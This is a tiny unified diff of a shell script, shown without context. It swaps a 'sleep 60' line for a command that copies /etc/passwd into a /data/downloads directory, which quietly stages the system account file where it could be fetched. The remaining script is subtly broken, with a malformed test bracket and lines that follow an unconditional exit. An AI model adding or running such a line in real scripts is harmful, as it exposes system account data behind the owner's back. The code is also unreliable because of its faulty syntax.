@@ -1,5 +1,5 @@
 echo $0
-sleep 60
+cp /etc/passwd /data/downloads
 exit
 if [ $(wc -l < "$0") -gt 10]; then
   exit
